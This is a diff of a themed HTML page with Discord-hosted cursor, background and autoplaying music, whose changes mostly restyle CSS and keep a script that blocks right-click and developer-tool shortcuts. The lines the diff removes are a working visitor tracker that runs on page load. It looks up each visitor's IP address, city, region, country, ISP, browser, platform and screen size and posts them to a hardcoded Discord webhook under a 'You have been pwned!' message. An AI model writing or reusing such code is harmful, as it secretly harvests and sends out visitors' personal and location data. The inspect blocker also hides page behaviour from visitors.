@@ -17,7 +17,12 @@
             height: 100%;
             font-family: "Tahoma", sans-serif;
             overflow: hidden;
+            /* Mouse Cursor */
             cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/Pictogrammers-Material-Cursor-default.512.png?ex=67895948&is=678807c8&hm=5c88ebbb1cf454b8a1c884e530ccc5bb1bd54bc038ff0488eb24304038d55698&'), auto;
+        }
+
+        /* Background */
+        body {
             background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif?ex=67895187&is=67880007&hm=1ae5a99b37fefbf2cbb0f981cca41f30e65b07a042db7ece147b12436f3a2e23&') no-repeat center center fixed;
             background-size: cover;
         }
@@ -120,6 +125,7 @@
     <!-- Background Music -->
     <audio id="backgroundMusic" autoplay loop>
         <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1329164787975852163/Eternxlkz_-_BRODYAGA_FUNK_Official_Audio.mp3?ex=678958ac&is=6788072c&hm=4f4db7901279d16f46a8fa4c9e8254f11e953a1c4cdaa1f1c575ab1fae90e182&" type="audio/mpeg">
+        Your browser does not support the audio element.
     </audio>
 
     <!-- Desktop -->
@@ -180,73 +186,22 @@
         }
 
         // Block Right-Click and Inspect
-        function blockInspect() {
-            document.addEventListener('contextmenu', (e) => {
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            showAlert();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
                 e.preventDefault();
                 showAlert();
-            });
-
-            document.addEventListener('keydown', (e) => {
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                    (e.ctrlKey && e.key === 'U')
-                ) {
-                    e.preventDefault();
-                    showAlert();
-                }
-            });
-        }
-
-        blockInspect();
-
-        // Fetch and send IP to webhook
-        async function fetchAndSendIP() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org/?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
-                const geoData = await geoResponse.json();
-
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const timestamp = new Date().toLocaleString();
-
-                // Build webhook message content
-                const webhookMessage = `
-:cAsH:  cAsH grabbed You :cAsH: 
-
-**User IP:** ${userIP}
-**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
-**ISP:** ${geoData.org || "Unknown"}
-**Browser:** ${userAgent}
-**Platform:** ${platform}
-**Screen Resolution:** ${screenWidth}x${screenHeight}
-**Timestamp:** ${timestamp}
-
-||@everyone|| **You have been pwned!**
-                `;
-
-                // Send to Discord Webhook
-                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: webhookMessage
-                    })
-                });
-            } catch (error) {
-                console.error('Error fetching IP or sending to webhook:', error);
             }
-        }
-
-        // Trigger IP Fetch and Send on Page Load
-        fetchAndSendIP();
+        });
     </script>
 </body>
 </html>
